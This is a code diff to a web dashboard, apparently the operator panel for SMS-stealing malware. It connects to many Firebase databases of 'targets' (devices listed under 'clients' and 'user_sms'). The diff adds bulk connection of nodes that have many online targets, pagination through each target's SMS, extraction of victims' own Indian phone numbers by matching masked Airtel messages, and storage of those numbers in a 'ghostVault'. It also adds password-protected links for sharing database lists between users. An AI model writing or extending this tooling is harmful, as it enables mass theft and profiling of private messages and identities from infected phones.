+function addUrlToFirebaseList(url) { if (firebaseList.some(item => item.url === url)) return false; removedFirebaseUrls = removedFirebaseUrls.filter(item => item !== url); firebaseList.push({ url, isConnected: true }); if (!activeDatabases.includes(url)) activeDatabases.push(url); saveStorage(); return true; }
+function addSharedUrlToFirebaseList(url) { if (firebaseList.some(item => item.url === url)) return 0; removedFirebaseUrls = removedFirebaseUrls.filter(item => item !== url); firebaseList.push({ url, isConnected: true }); if (!activeDatabases.includes(url)) activeDatabases.push(url); saveStorage(); return 1; }
 function disconnectFirebase(url) { let item = firebaseList.find(i => i.url === url); if (item && item.isConnected) { item.isConnected = false; activeDatabases = activeDatabases.filter(u => u !== url); globalTargetsCache = globalTargetsCache.filter(t => t.dbUrl !== url); updateDashboardCounts(); renderFilteredList(true); showToast("NODE DISCONNECTED."); } }
-function connectFirebase(url) { let item = firebaseList.find(i => i.url === url); if (!item || item.isConnected) return; if (firebaseList.filter(i => i.isConnected).length >= 2) { showToast("LIMIT REACHED. DISCONNECT A NODE FIRST."); return; } item.isConnected = true; activeDatabases.push(url); showToast("NODE CONNECTED."); }
-function deleteFirebase(url) { cyberConfirm('Remove this Firebase permanently?', () => { firebaseList = firebaseList.filter(item => item.url !== url); activeDatabases = firebaseList.filter(item => item.isConnected).map(item => item.url); globalTargetsCache = globalTargetsCache.filter(t => t.dbUrl !== url); updateDashboardCounts(); renderFilteredList(true); renderFirebaseList(); showToast("NODE PURGED."); }); }
+function connectFirebase(url) { let item = firebaseList.find(i => i.url === url); if (!item || item.isConnected) return; item.isConnected = true; if (!activeDatabases.includes(url)) activeDatabases.push(url); showToast("NODE CONNECTED."); }
+function deleteFirebase(url, event) { if (event) { event.preventDefault(); event.stopPropagation(); } cyberConfirm('Remove this Firebase permanently?', () => { firebaseList = firebaseList.filter(item => item.url !== url); activeDatabases = firebaseList.filter(item => item.isConnected).map(item => item.url); globalTargetsCache = globalTargetsCache.filter(t => t.dbUrl !== url); if (!removedFirebaseUrls.includes(url)) removedFirebaseUrls.push(url); saveStorage(); updateDashboardCounts(); renderFilteredList(true); renderFirebaseList(); showToast("NODE PURGED."); }); }
 function syncActiveDatabasesFromList() { activeDatabases = firebaseList.filter(item => item.isConnected).map(item => item.url); }
 
-function renderFirebaseList() {
+function renderFirebaseListLegacy() {
   const container = document.getElementById("firebase-list-container"); if (!container) return;
   if (firebaseList.length === 0) { container.innerHTML = '<div class="empty-state">No firebases connected yet.</div>'; return; }
   let html = ''; let listToRender = isFbExpanded ? firebaseList : firebaseList.slice(0, 2);
@@ -897,24 +1298,421 @@ function renderFirebaseList() {
   container.innerHTML = html;
 }
 
+function renderFirebaseList() {
+  const container = document.getElementById('firebase-list-container');
+  if (!container) return;
+  if (firebaseList.length === 0) { container.innerHTML = '<div class="empty-state">No firebases connected yet.</div>'; return; }
+  const listToRender = isFbExpanded ? firebaseList : firebaseList.slice(0, 2);
+  let html = '';
+  listToRender.forEach(item => {
+    const displayUrl = item.url.replace(/^https:\/\//, '').replace(/\/\.json$/, '');
+    const btnClass = item.isConnected ? 'delete-btn' : 'connection-btn';
+    const btnText = item.isConnected ? 'DISCONNECT' : 'CONNECT';
+    const onClick = item.isConnected
+      ? `disconnectFirebase('${item.url}'); renderFirebaseList(); updateDashboardCounts(); fetchAndRenderTargets(false);`
+      : `connectFirebase('${item.url}'); renderFirebaseList(); updateDashboardCounts(); fetchAndRenderTargets(false);`;
+    html += `<div class="fb-list-item"><span class="fb-url">${displayUrl}</span><button class="${btnClass}" onclick="${onClick}">${btnText}</button><button type="button" class="firebase-delete-btn" aria-label="Delete Firebase" title="Delete Firebase" onclick="deleteFirebase('${item.url}', event)"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M10 11v6M14 11v6M9 7l1-3h4l1 3M6 7l1 13h10l1-13"/></svg></button></div>`;
+  });
+  if (firebaseList.length > 2) html += isFbExpanded
+    ? '<button class="fb-expand-btn" onclick="isFbExpanded=false; renderFirebaseList()">> COLLAPSE LIST</button>'
+    : `<button class="fb-expand-btn" onclick="isFbExpanded=true; renderFirebaseList()">> [ ${firebaseList.length} CONNECTED ] EXPAND LIST</button>`;
+  container.innerHTML = html;
+}
+
+let bulkFirebaseMode = '';
+
+function toggleFirebaseMenu(kind) {
+  const menu = document.getElementById(`${kind}-action-menu`);
+  const other = document.getElementById(kind === 'connect' ? 'delete-action-menu' : 'connect-action-menu');
+  const willOpen = !menu.classList.contains('open');
+  if (other) other.classList.remove('open');
+  menu.classList.toggle('open', willOpen);
+}
+
+function closeFirebaseMenus() {
+  document.getElementById('connect-action-menu')?.classList.remove('open');
+  document.getElementById('delete-action-menu')?.classList.remove('open');
+}
+
+function getSelectedBulkFirebaseUrls() {
+  return Array.from(document.querySelectorAll('.bulk-firebase-check:checked')).map(input => input.value);
+}
+
+function renderBulkFirebaseChoices() {
+  const list = document.getElementById('bulk-firebase-list');
+  if (!firebaseList.length) { list.innerHTML = '<div class="empty-state">No Firebase nodes available.</div>'; return; }
+  list.innerHTML = firebaseList.map((item, index) => {
+    const label = item.url.replace(/^https:\/\//, '').replace(/\/\.json$/, '');
+    return `<div class="bulk-choice"><input class="bulk-firebase-check" id="bulk-fb-${index}" type="checkbox" value="${item.url}"><label for="bulk-fb-${index}">${label}</label></div>`;
+  }).join('');
+}
+
+function openBulkFirebaseModal(mode) {
+  closeFirebaseMenus();
+  if (!firebaseList.length) { showToast('NO FIREBASES AVAILABLE.'); return; }
+  bulkFirebaseMode = mode;
+  const title = document.getElementById('bulk-firebase-title');
+  const subtitle = document.getElementById('bulk-firebase-subtitle');
+  const minimumWrap = document.getElementById('bulk-minimum-wrap');
+  const list = document.getElementById('bulk-firebase-list');
+  const action = document.getElementById('bulk-firebase-action');
+  const isHighMode = mode === 'connect-high';
+  const isDeleteMode = mode === 'delete-select';
+  title.textContent = isHighMode ? 'ONLY HIGH TARGETS' : (isDeleteMode ? 'DELETE SELECTED' : 'CONNECT SELECTED');
+  subtitle.textContent = isHighMode ? 'Only Firebase nodes meeting your online-target minimum will connect.' : (isDeleteMode ? 'Select Firebase nodes to permanently remove.' : 'Select Firebase nodes to connect.');
+  minimumWrap.style.display = isHighMode ? 'block' : 'none';
+  list.style.display = isHighMode ? 'none' : 'block';
+  if (!isHighMode) renderBulkFirebaseChoices();
+  action.textContent = isHighMode ? 'CHECK AND CONNECT' : (isDeleteMode ? 'DELETE SELECTED' : 'CONNECT SELECTED');
+  action.style.borderColor = isDeleteMode ? 'rgba(255,51,102,.78)' : '';
+  action.style.color = isDeleteMode ? '#ff668a' : '';
+  document.getElementById('bulkFirebaseModal').classList.add('open');
+}
+
+function closeBulkFirebaseModal() {
+  document.getElementById('bulkFirebaseModal').classList.remove('open');
+  bulkFirebaseMode = '';
+}
+
+function connectFirebaseUrls(urls, toastText = '') {
+  let connected = 0;
+  urls.forEach(url => {
+    const item = firebaseList.find(entry => entry.url === url);
+    if (item && !item.isConnected) { item.isConnected = true; connected++; }
+  });
+  syncActiveDatabasesFromList();
+  renderFirebaseList();
+  updateDashboardCounts();
+  pauseClientPollingForRegex = true;
+  regexFinalRefreshPending = true;
+  fetchAndRenderTargets(false);
+  if (toastText) showToast(toastText.replace('{count}', String(connected || urls.length)));
+}
+
+function connectAllFirebases() {
+  closeFirebaseMenus();
+  connectFirebaseUrls(firebaseList.map(item => item.url), 'ALL {count} FIREBASES CONNECTED.');
+}
+
+function removeFirebaseUrls(urls) {
+  const urlSet = new Set(urls);
+  firebaseList = firebaseList.filter(item => !urlSet.has(item.url));
+  activeDatabases = activeDatabases.filter(url => !urlSet.has(url));
+  globalTargetsCache = globalTargetsCache.filter(target => !urlSet.has(target.dbUrl));
+  urls.forEach(url => { if (!removedFirebaseUrls.includes(url)) removedFirebaseUrls.push(url); });
+  saveStorage();
+  renderFirebaseList();
+  updateDashboardCounts();
+  renderFilteredList(true);
+}
+
+function deleteAllFirebases() {
+  closeFirebaseMenus();
+  if (!firebaseList.length) return;
+  cyberConfirm('Delete all Firebase nodes permanently?', () => {
+    const urls = firebaseList.map(item => item.url);
+    removeFirebaseUrls(urls);
+    showToast(`${urls.length} FIREBASES DELETED.`);
+  });
+}
+
+async function removeDeactivatedFirebases() {
+  closeFirebaseMenus();
+  if (!firebaseList.length) return;
+  cyberConfirm('Check every Firebase and remove nodes with no clients data?', async () => {
+    showToast('CHECKING FIREBASE ACTIVITY...');
+    const checks = await Promise.all(firebaseList.map(async item => {
+      try {
+        const baseRoot = item.url.replace(/\/\.json$/, '');
+        const clients = await fetchWithTimeout(`${baseRoot}/clients/.json?shallow=true`, 7000);
+        return { url: item.url, deactivated: !clients || typeof clients !== 'object' || Object.keys(clients).length === 0 };
+      } catch (error) {
+        return { url: item.url, deactivated: false };
+      }
+    }));
+    const staleUrls = checks.filter(item => item.deactivated).map(item => item.url);
+    if (!staleUrls.length) { showToast('NO DEACTIVATED FIREBASES FOUND.'); return; }
+    removeFirebaseUrls(staleUrls);
+    showToast(`${staleUrls.length} DEACTIVATED FIREBASES REMOVED.`);
+  });
+}
+
+async function getOnlineTargetCount(url) {
+  const data = await fetchDatabaseSmart(url);
+  const onlineDids = new Set();
+  Object.entries(data.clients || {}).forEach(([did, value]) => { if (isOnline(value)) onlineDids.add(String(did)); });
+  Object.entries(data.user_data || {}).forEach(([did, value]) => { if (isOnline(value)) onlineDids.add(String(did)); });
+  return onlineDids.size;
+}
+
+async function connectHighTargetFirebases() {
+  const input = document.getElementById('bulk-minimum-input');
+  const status = document.getElementById('bulk-high-status');
+  const action = document.getElementById('bulk-firebase-action');
+  const rawMinimum = input.value.trim();
+  if (!/^\d{1,3}$/.test(rawMinimum) || Number(rawMinimum) < 1) { status.textContent = 'ENTER A NUMBER FROM 1 TO 999.'; return; }
+  const minimum = Number(rawMinimum);
+  action.disabled = true;
+  status.textContent = `CHECKING ${firebaseList.length} FIREBASES...`;
+  const results = await Promise.all(firebaseList.map(async item => {
+    try { return { url: item.url, online: await getOnlineTargetCount(item.url) }; }
+    catch (error) { return { url: item.url, online: -1 }; }
+  }));
+  const matchingUrls = results.filter(item => item.online >= minimum).map(item => item.url);
+  action.disabled = false;
+  if (!matchingUrls.length) { status.textContent = 'NO FIREBASE MATCHED THIS MINIMUM.'; return; }
+  connectFirebaseUrls(matchingUrls, '{count} HIGH-TARGET FIREBASES CONNECTED.');
+  closeBulkFirebaseModal();
+}
+
+function applyBulkFirebaseAction() {
+  if (bulkFirebaseMode === 'connect-high') { connectHighTargetFirebases(); return; }
+  const selectedUrls = getSelectedBulkFirebaseUrls();
+  if (!selectedUrls.length) { showToast('SELECT AT LEAST ONE FIREBASE.'); return; }
+  if (bulkFirebaseMode === 'connect-select') {
+    connectFirebaseUrls(selectedUrls, '{count} SELECTED FIREBASES CONNECTED.');
+    closeBulkFirebaseModal();
+    return;
+  }
+  if (bulkFirebaseMode === 'delete-select') {
+    cyberConfirm(`Delete ${selectedUrls.length} selected Firebase nodes permanently?`, () => {
+      removeFirebaseUrls(selectedUrls);
+      closeBulkFirebaseModal();
+      showToast(`${selectedUrls.length} FIREBASES DELETED.`);
+    });
+  }
+}
+
+document.addEventListener('pointerdown', event => {
+  if (!event.target.closest('.firebase-menu-wrap')) closeFirebaseMenus();
+  if (!event.target.closest('.carrier-filter-wrap')) closeCarrierFilterMenu();
+  if (!event.target.closest('.theme-picker-wrap')) closeThemeMenu();
+  if (!event.target.closest('.share-menu-wrap')) closeShareMenu();
+});
+
 async function addDatabase() {
     const input = document.getElementById("db-input-url"); const btn = document.getElementById("add-db-btn"); const card = document.getElementById("add-db-card");
     let rawStr = input.value.trim(); if(!rawStr) { showToast("PASTE NODES FIRST!"); return; } let extractedUrls = extractUrlsFromText(rawStr); if (extractedUrls.length === 0) { showToast("NO VALID URL DETECTED."); return; }
     isScanning = true; card.classList.add("loading"); input.disabled = true; btn.disabled = true; btn.innerText = "SCANNING...";
-    let addedCount = 0; const statusDiv = document.getElementById("targetList");
+    let addedCount = 0; let shouldRefreshTargets = false; const statusDiv = document.getElementById("targetList");
     try {
         for (const url of extractedUrls) {
             statusDiv.innerHTML = `<div class="empty-state">⏳ Testing ${url}...</div>`;
             try { let testUrl = url.replace(/\.json$/, '.json?shallow=true'); const testRes = await fetchWithTimeout(testUrl, 5000); if (testRes === null || (typeof testRes === 'object' && Object.keys(testRes).length === 0)) throw new Error("Empty"); if (addUrlToFirebaseList(url)) addedCount++; } catch (e) { showToast(`CONNECTION FAILED: ${url}`); }
         }
-        if (addedCount > 0) { input.value = ""; renderFirebaseList(); updateDashboardCounts(); fetchAndRenderTargets(false); showToast(`${addedCount} NODES ADDED.`); } else { statusDiv.innerHTML = `<div class="empty-state">No valid URLs added.</div>`; }
+        if (addedCount > 0) { input.value = ""; renderFirebaseList(); updateDashboardCounts(); shouldRefreshTargets = true; showToast(`${addedCount} NODES ADDED.`); } else { statusDiv.innerHTML = `<div class="empty-state">No valid URLs added.</div>`; }
     } finally { isScanning = false; card.classList.remove("loading"); input.disabled = false; btn.disabled = false; btn.innerText = "ADD"; }
+    if (shouldRefreshTargets) {
+        pauseClientPollingForRegex = true;
+        regexFinalRefreshPending = true;
+        fetchAndRenderTargets(false);
+    }
 }
 
-function openShareModal() { let listHTML = ''; if (firebaseList.length === 0) { listHTML = '<div class="empty-state">No databases available to share.</div>'; } else { firebaseList.forEach((db, i) => { let displayUrl = db.url.replace(/^https:\/\//, '').replace(/\/\.json$/, ''); listHTML += `<div class="fb-list-item" style="justify-content:flex-start; gap:10px;"><input type="checkbox" id="share-cb-${i}" value="${db.url}" style="accent-color: #c240ff; transform: scale(1.3);"><label for="share-cb-${i}" class="fb-url" style="cursor:pointer; font-size:12px;">${displayUrl}</label></div>`; }); } document.getElementById('share-db-list').innerHTML = listHTML; document.getElementById('shareModal').classList.add('open'); document.getElementById('share-result').style.display = 'none'; }
+let shareSelectionMode = 'select';
+let shareSelectedUrls = new Set();
+let shareLinkType = '';
+let shareProtectionMode = 'public';
+let secureShareToken = '';
+
+function toggleShareMenu(event) {
+  if (event) event.stopPropagation();
+  const menu = document.getElementById('share-action-menu');
+  if (menu) menu.classList.toggle('open');
+}
+
+function closeShareMenu() {
+  const menu = document.getElementById('share-action-menu');
+  if (menu) menu.classList.remove('open');
+}
+
+function getShareSelectionLabel() {
+  if (shareSelectionMode === 'all') return 'ALL FIREBASES';
+  if (shareSelectionMode === 'connected') return 'CONNECTED FIREBASES';
+  return 'SELECT FIREBASES';
+}
+
+function updateShareSelectionCount() {
+  const count = shareSelectedUrls.size;
+  const countEl = document.getElementById('share-selection-count');
+  if (countEl) countEl.textContent = `${count} FIREBASE${count === 1 ? '' : 'S'} SELECTED`;
+}
+
+function renderShareFirebaseChoices() {
+  const list = document.getElementById('share-db-list');
+  if (!list) return;
+  if (!firebaseList.length) { list.innerHTML = '<div class="empty-state">No Firebase nodes available to share.</div>'; updateShareSelectionCount(); return; }
+  list.innerHTML = firebaseList.map((db, index) => {
+    const displayUrl = db.url.replace(/^https:\/\//, '').replace(/\/\.json$/, '');
+    const checked = shareSelectedUrls.has(db.url) ? 'checked' : '';
+    const state = db.isConnected ? 'CONNECTED' : 'DISCONNECTED';
+    return `<div class="bulk-choice"><input class="share-firebase-check" id="share-cb-${index}" type="checkbox" value="${db.url}" ${checked} onchange="toggleShareFirebase(${index})"><label for="share-cb-${index}">${displayUrl}<span style="display:block; margin-top:4px; color:var(--text-dim); font-size:8px; letter-spacing:1px;">${state}</span></label></div>`;
+  }).join('');
+  updateShareSelectionCount();
+}
+
+function toggleShareFirebase(index) {
+  const url = firebaseList[index] && firebaseList[index].url;
+  if (!url) return;
+  if (shareSelectedUrls.has(url)) shareSelectedUrls.delete(url);
+  else shareSelectedUrls.add(url);
+  updateShareSelectionCount();
+}
+
+function openShareModal(mode = 'select') {
+  closeShareMenu();
+  if (!firebaseList.length) { showToast('NO FIREBASES AVAILABLE.'); return; }
+  shareSelectionMode = mode;
+  shareLinkType = '';
+  shareProtectionMode = 'public';
+  shareSelectedUrls = new Set(mode === 'all' ? firebaseList.map(item => item.url) : mode === 'connected' ? firebaseList.filter(item => item.isConnected).map(item => item.url) : []);
+  if (mode === 'connected' && shareSelectedUrls.size === 0) { showToast('NO CONNECTED FIREBASES AVAILABLE.'); return; }
+  renderShareFirebaseChoices();
+  showShareSelectionStep();
+  document.getElementById('shareModal').classList.add('open');
+}
+
 function closeShareModal() { document.getElementById('shareModal').classList.remove('open'); }
-function generateLink() { let selected = []; firebaseList.forEach((db, i) => { let cb = document.getElementById(`share-cb-${i}`); if (cb && cb.checked) selected.push(cb.value); }); if(selected.length === 0) { showToast("SELECT AT LEAST 1 NODE."); return; } let alias = document.getElementById('share-name').value.trim() || 'Anonymous'; let encodedDb = btoa(selected.join(',')); let encodedAlias = encodeURIComponent(alias); document.getElementById('share-link-out').value = `${window.location.href.split('?')[0]}?payload=${encodedDb}&by=${encodedAlias}`; document.getElementById('share-result').style.display = 'block'; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e) {} }
+
+function showShareSelectionStep() {
+  document.getElementById('share-modal-title').textContent = getShareSelectionLabel();
+  document.getElementById('share-step-copy').textContent = 'Review the Firebase nodes included in this share.';
+  document.getElementById('share-selection-panel').style.display = 'block';
+  document.getElementById('share-link-panel').style.display = 'none';
+  document.getElementById('share-back-btn').style.display = 'none';
+  document.getElementById('share-next-btn').textContent = 'CONTINUE';
+  document.getElementById('share-next-btn').onclick = showShareLinkStep;
+}
+
+function showShareLinkStep() {
+  if (!shareSelectedUrls.size) { showToast('SELECT AT LEAST 1 NODE.'); return; }
+  document.getElementById('share-modal-title').textContent = 'CREATE SHARE LINK';
+  document.getElementById('share-step-copy').textContent = `${shareSelectedUrls.size} FIREBASE${shareSelectedUrls.size === 1 ? '' : 'S'} READY TO SHARE`;
+  document.getElementById('share-selection-panel').style.display = 'none';
+  document.getElementById('share-link-panel').style.display = 'block';
+  document.getElementById('share-back-btn').style.display = 'block';
+  document.getElementById('share-next-btn').textContent = 'CREATE SECURE LINK';
+  document.getElementById('share-next-btn').onclick = createSecureShareLink;
+  document.getElementById('share-result').style.display = 'none';
+  selectShareLinkType('default');
+  selectShareProtection('public');
+}
+
+function selectShareLinkType(type) {
+  shareLinkType = type;
+  document.querySelectorAll('.share-type-card').forEach(card => card.classList.toggle('active', card.dataset.shareType === type));
+  document.getElementById('share-custom-field').classList.toggle('open', type === 'custom');
+}
+
+function selectShareProtection(mode) {
+  shareProtectionMode = mode;
+  document.querySelectorAll('.share-protection-card').forEach(card => card.classList.toggle('active', card.dataset.shareProtection === mode));
+  document.getElementById('share-password-field').classList.toggle('open', mode === 'password');
+}
+
+async function createSecureShareLink() {
+  if (!shareLinkType) { showToast('SELECT A LINK TYPE.'); return; }
+  const alias = document.getElementById('share-custom-alias').value.trim();
+  const password = document.getElementById('share-password').value;
+  if (shareLinkType === 'custom' && !/^[a-z0-9][a-z0-9-]{2,59}$/i.test(alias)) { showToast('USE 3-60 LETTERS, NUMBERS, OR DASHES.'); return; }
+  if (shareProtectionMode === 'password' && password.length < 8) { showToast('PASSWORD MUST BE AT LEAST 8 CHARACTERS.'); return; }
+  const button = document.getElementById('share-next-btn');
+  button.disabled = true;
+  button.textContent = 'CREATING...';
+  try {
+    const response = await fetch('/api/shares', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        urls: Array.from(shareSelectedUrls),
+        linkType: shareLinkType,
+        alias,
+        protection: { mode: shareProtectionMode, password }
+      })
+    });
+    const data = await response.json().catch(() => ({}));
+    if (!response.ok) throw new Error(data.detail || 'Unable to create secure link');
+    document.getElementById('share-link-out').value = data.url;
+    document.getElementById('share-result').style.display = 'block';
+    showToast('SECURE LINK CREATED.');
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e) {}
+  } catch (error) {
+    showToast(error.message || 'SECURE LINK CREATION FAILED.');
+  } finally {
+    button.disabled = false;
+    button.textContent = 'CREATE SECURE LINK';
+  }
+}
 function copyShareLink() { navigator.clipboard.writeText(document.getElementById('share-link-out').value); showToast("LINK COPIED TO CLIPBOARD!"); }
+
+function getSecureShareTokenFromPath() {
+  const parts = window.location.pathname.split('/').filter(Boolean);
+  if (parts.length !== 2 || parts[0] !== 's' || !/^[a-zA-Z0-9_-]{3,80}$/.test(parts[1])) return '';
+  return parts[1];
+}
+
+function closeShareUnlockModal() {
+  document.getElementById('shareUnlockModal').classList.remove('open');
+}
+
+function openShareUnlockModal(label) {
+  document.getElementById('share-unlock-copy').textContent = `Enter the password for ${label}.`;
+  const input = document.getElementById('share-unlock-password');
+  input.value = '';
+  document.getElementById('shareUnlockModal').classList.add('open');
+  setTimeout(() => input.focus(), 250);
+}
+
+function importSecureShareUrls(urls, label) {
+  let addedCount = 0;
+  (Array.isArray(urls) ? urls : []).forEach(url => {
+    if (typeof url === 'string' && url.includes('.firebaseio.com/.json')) addedCount += addSharedUrlToFirebaseList(url);
+  });
+  if (!addedCount) { showToast('NO NEW FIREBASES TO IMPORT.'); return; }
+  renderFirebaseList();
+  updateDashboardCounts();
+  fetchAndRenderTargets(false);
+  const welcomeEl = document.querySelector('.hero-info p');
+  if (welcomeEl) welcomeEl.textContent = `SECURE SHARE: ${label}`;
+  showToast(`${addedCount} FIREBASE${addedCount === 1 ? '' : 'S'} IMPORTED.`);
+}
+
+async function loadSecureShareLink(token) {
+  secureShareToken = token;
+  try {
+    const response = await fetch(`/api/shares/${encodeURIComponent(token)}`);
+    const data = await response.json().catch(() => ({}));
+    if (!response.ok) throw new Error(data.detail || 'Unable to open secure share');
+    if (data.protected) {
+      openShareUnlockModal(data.label || token);
+      return;
+    }
+    importSecureShareUrls(data.urls, data.label || token);
+  } catch (error) {
+    showToast(error.message || 'SECURE SHARE UNAVAILABLE.');
+  }
+}
+
+async function unlockSecureShare() {
+  if (!secureShareToken) return;
+  const input = document.getElementById('share-unlock-password');
+  const password = input.value;
+  if (!password) { showToast('ENTER THE SHARE PASSWORD.'); return; }
+  try {
+    const response = await fetch(`/api/shares/${encodeURIComponent(secureShareToken)}/unlock`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password })
+    });
+    const data = await response.json().catch(() => ({}));
+    if (!response.ok) throw new Error(data.detail || 'Unable to unlock secure share');
+    closeShareUnlockModal();
+    importSecureShareUrls(data.urls, data.label || secureShareToken);
+  } catch (error) {
+    showToast(error.message || 'UNLOCK FAILED.');
+  }
+}
+
 function checkSharedPayload() {
     const urlParams = new URLSearchParams(window.location.search); let payload = urlParams.get('payload'); let by = urlParams.get('by');
     if (payload) {
@@ -938,7 +1736,54 @@ async function fetchDatabaseSmart(baseUrl) {
     const clients = await fetchNode('clients'); const userData = await fetchNode('user_data'); return { clients: clients || null, user_data: userData || null };
 }
 
-function extractOwnPhonesFromSMS(smsDict) {
+const SMS_PAGE_SIZE = 100;
+const SMS_SCAN_PAGE_SIZE = 220;
+const SMS_DEEP_SCAN_PAGE_SIZE = 800;
+const SMS_BG_BATCH_SIZE = 8;
+const SMS_DEEP_BG_BATCH_SIZE = 4;
+const SMS_BG_NEXT_DELAY_MS = 120;
+const SMS_DEEP_BG_NEXT_DELAY_MS = 220;
+const SMS_HYDRATE_CONCURRENCY = 10;
+
+function getSmsTimestamp(msg, key = '') {
+    let ts = parseInt((msg && typeof msg === 'object' && (msg.date || msg.timestamp || msg.id)) || key || 0) || 0;
+    return ts > 0 && String(ts).length <= 10 ? ts * 1000 : ts;
+}
+
+function getSmsEntriesNewestFirst(smsDict) {
+    if (!smsDict || typeof smsDict !== 'object') return [];
+    return Object.entries(smsDict)
+        .filter(([, msg]) => typeof msg === 'string' || (msg && typeof msg === 'object'))
+        .sort(([keyA, a], [keyB, b]) => getSmsTimestamp(b, keyB) - getSmsTimestamp(a, keyA));
+}
+
+function keepLatestSms(smsDict, limit = SMS_PAGE_SIZE) {
+    return Object.fromEntries(getSmsEntriesNewestFirst(smsDict).slice(0, limit));
+}
+
+function getSmsPageUrl(baseRoot, node, did, endAtKey = '', pageSize = SMS_PAGE_SIZE) {
+    let params = new URLSearchParams({ orderBy: '"$key"', limitToLast: String(endAtKey ? pageSize + 1 : pageSize) });
+    if (endAtKey) params.set('endAt', JSON.stringify(endAtKey));
+    return `${baseRoot}/${node}/${did}/.json?${params.toString()}`;
+}
+
+async function fetchSmsForTarget(baseRoot, did, timeout = 8000, scanForPhones = false, scanPageSize = 0) {
+    let pageSize = scanForPhones ? (scanPageSize || SMS_SCAN_PAGE_SIZE) : SMS_PAGE_SIZE;
+    for (let node of ['messages', 'user_sms']) {
+        try {
+            const page = await fetchWithTimeout(getSmsPageUrl(baseRoot, node, did, '', pageSize), timeout);
+            if (!page || typeof page !== 'object' || Object.keys(page).length === 0) continue;
+            const latestSms = keepLatestSms(page);
+            if (!scanForPhones) return { smsDict: latestSms, phones: [] };
+            return { smsDict: latestSms, phones: extractOwnPhonesFromSMS(page, pageSize).slice(0, 2) };
+        } catch (e) {
+            continue;
+        }
+    }
+    return { smsDict: null, phones: [] };
+}
+
+function extractOwnPhonesFromSMS(smsDict, airtelLookupLimit = SMS_SCAN_PAGE_SIZE) {
     try {
         if (!smsDict || typeof smsDict !== 'object') return [];
         
@@ -964,18 +1809,72 @@ function extractOwnPhonesFromSMS(smsDict) {
         const items = []; 
         for (let key in smsDict) { 
             let msg = smsDict[key]; 
+            if (typeof msg === 'string') msg = { body: msg, sender: 'Unknown' };
             if (msg && typeof msg === 'object') { 
-                let ts = parseInt(msg.date || msg.timestamp || 0) || 0; 
-                items.push({ ts, msg }); 
+                items.push({ ts: getSmsTimestamp(msg, key), msg }); 
             } 
         } 
         items.sort((a,b) => b.ts - a.ts);
+        const scanLimit = Number.isFinite(airtelLookupLimit) ? Math.max(1, airtelLookupLimit) : items.length;
+        const searchItems = items.slice(0, scanLimit);
+        const likelyPhoneText = /(?:^|[^\d])(?:91[\s-]*)?[6-9](?:[\s-]*\d){9}(?!\d)|[xX*]{2,}/;
         
-        const found = [];
+        function normalizeIndianMobile(raw) {
+            let digits = String(raw || '').replace(/\D/g, '');
+            if (digits.length === 10 && /^[6-9]\d{9}$/.test(digits)) return digits;
+            if (digits.length === 12 && /^91[6-9]\d{9}$/.test(digits)) return digits.slice(2);
+            return null;
+        }
+
+        function getMaskedAirtelMatches() {
+            const maskedPatterns = [
+                /(?:^|[^\d])([6-9]\d{3})(?:[xX*][\s-]*){2,}(\d{0,2})(?!\d)/g,
+                /(?:^|[^\d])([6-9]\d)(?:[xX*][\s-]*){4,}(\d{2})(?!\d)/g
+            ];
+            const fullNumberPattern = /(?:^|[^\d])((?:91)?[6-9]\d{9})(?!\d)/g;
+            const hints = [];
+            const candidates = [];
+
+            // Airtel's masked-number messages are useful only when corroborated by a full number in this target's recent SMS data.
+            for (let item of searchItems) {
+                let body = String(item.msg.body || item.msg.msg || item.msg.message || item.msg.Body || item.msg.Message || item.msg.text || '');
+                let sender = String(item.msg.sender || item.msg.address || item.msg.ph || item.msg.Sender || item.msg.Address || '');
+                if (!body || !likelyPhoneText.test(body)) continue;
+
+                fullNumberPattern.lastIndex = 0;
+                let fullMatch;
+                while ((fullMatch = fullNumberPattern.exec(body))) {
+                    let phone = normalizeIndianMobile(fullMatch[1]);
+                    if (phone && !candidates.includes(phone)) candidates.push(phone);
+                }
+
+                if (!/AIRTEL/i.test(body + ' ' + sender)) continue;
+                for (let maskedPattern of maskedPatterns) {
+                    maskedPattern.lastIndex = 0;
+                    let maskedMatch;
+                    while ((maskedMatch = maskedPattern.exec(body))) {
+                        let prefix = maskedMatch[1];
+                        let suffix = maskedMatch[2] || '';
+                        if (!hints.some(hint => hint.prefix === prefix && hint.suffix === suffix)) hints.push({ prefix, suffix });
+                    }
+                }
+            }
+
+            const priorityMatches = [];
+            for (let hint of hints) {
+                let phone = candidates.find(candidate => candidate.startsWith(hint.prefix) && (!hint.suffix || candidate.endsWith(hint.suffix)));
+                if (phone && !priorityMatches.some(match => match.phone === phone)) priorityMatches.push({ phone, carrier: 'AIRTEL' });
+                if (priorityMatches.length >= 2) break;
+            }
+            return priorityMatches;
+        }
+
+        const found = getMaskedAirtelMatches();
+        if (found.length >= 2) return found;
         
-        for (let item of items) {
+        for (let item of searchItems) {
             let body = String(item.msg.body || item.msg.msg || item.msg.message || ''); 
-            if (!body) continue;
+            if (!body || !likelyPhoneText.test(body)) continue;
             
             for (let pat of patterns) {
                 let match = body.match(pat);
@@ -1076,7 +1975,10 @@ function mergePhones(target, extractedPhones) {
 
     if (target.p1 !== "Unknown" && target.p1 !== ghostVault[vKey].p1) { ghostVault[vKey].p1 = target.p1; ghostVault[vKey].c1 = target.c1; vaultUpdated = true; }
     if (target.p2 !== "Unknown" && target.p2 !== ghostVault[vKey].p2) { ghostVault[vKey].p2 = target.p2; ghostVault[vKey].c2 = target.c2; vaultUpdated = true; }
-    if (vaultUpdated) saveStorage();
+    if (vaultUpdated) {
+        if (isBgProcessing) requestVaultSave(300);
+        else { vaultSavePending = true; flushVaultSave(); }
+    }
 
     if (target.p1 === "Unknown" && ghostVault[vKey].p1 !== "Unknown") {
         target.p1 = ghostVault[vKey].p1; target.c1 = ghostVault[vKey].c1; target.p1Src = 'vault';
@@ -1086,15 +1988,73 @@ function mergePhones(target, extractedPhones) {
     }
 }
 
+function getTargetPhoneProfile(target) {
+    const slots = [
+        { phone: cleanNumForScan(target && target.p1), src: target && target.p1Src },
+        { phone: cleanNumForScan(target && target.p2), src: target && target.p2Src }
+    ];
+    const seen = new Set();
+    let knownCount = 0;
+    let rxCount = 0;
